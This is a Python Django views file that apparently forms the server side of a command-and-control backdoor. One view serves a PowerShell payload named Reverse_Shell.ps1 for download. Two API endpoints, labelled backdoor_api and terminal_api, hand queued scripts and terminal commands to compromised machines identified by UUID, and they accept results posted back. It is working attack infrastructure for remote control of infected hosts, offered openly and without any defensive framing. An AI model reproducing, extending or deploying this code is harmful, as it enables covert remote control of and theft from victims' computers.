from django.shortcuts import render
from django.http import HttpResponse, FileResponse
from django.utils.encoding import smart_str
from mimetypes import guess_type
from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.response import Response
from django.views.decorators.csrf import csrf_exempt
from connections.models import Connection, ScriptData, TerminalData
from payloads.models import TerminalInputs, ScriptInputs


def download_payload(request):
    file_path = './payloads/Reverse_Shell.ps1'
    with open(file_path, 'rb') as f:
        response = HttpResponse(f, content_type=guess_type(file_path)[0])
        response['Content-Disposition'] = 'attachment; filename=Reverse_Shell.ps1'
        response['Content-Length'] = len(response.content)
        return response


@api_view(['GET', 'POST'])
def backdoor_api(request, uuid):
    if ScriptInputs.objects.all().count() > 100:
        ScriptInputs.objects.all().delete()
    if request.method == 'GET':
        try:
            connection = Connection.objects.get(uuid=uuid)
            script_data = ScriptData.objects.get(connection_id=connection)
            script = {'active': True, 'uuid': str(script_data.connection_id.uuid).upper(), 'payload': script_data.input,
                      'payload_name': script_data.payload_name, 'terminal': False}
            ScriptInputs.objects.create(input=script_data.payload_name)
        except:
            script = {'active': False, 'uuid': 'None'}
            ScriptInputs.objects.create(input='None')
        script_log = [i.input for i in ScriptInputs.objects.all()]
        try:
            if script_log[-1] == script_log[-2]:
                return Response({'active': False, 'uuid': 'None'})
        except IndexError:
            return Response(script)
        return Response(script)

    if request.method == 'POST':
        print(f'POST IS: {request.POST}')
        return Response(request.POST)


@api_view(['GET', 'POST'])
def terminal_api(request, uuid):
    if TerminalInputs.objects.all().count() > 50:
        TerminalInputs.objects.all().delete()
    if request.method == 'GET':
        try:
            connection = Connection.objects.get(uuid=uuid)
            terminal_data = TerminalData.objects.get(connection_id=connection)
            terminal = {'active': True, 'uuid': str(terminal_data.connection_id.uuid).upper(), 'input': terminal_data.input,
                        'terminal': True}
            TerminalInputs.objects.create(input=terminal_data.input)
        except:
            terminal = {'active': False, 'uuid': 'None', 'input': 'None'}
            TerminalInputs.objects.create(input='None')
        terminal_log = [i.input for i in TerminalInputs.objects.all()]
        try:
            if terminal_log[-1] == terminal_log[-2]:
                return Response({'active': False, 'uuid': 'None'})
        except IndexError:
            return Response(terminal)
        return Response(terminal)

    if request.method == 'POST':
        print(f'POST IS: {request.POST}')
        return Response(request.POST)
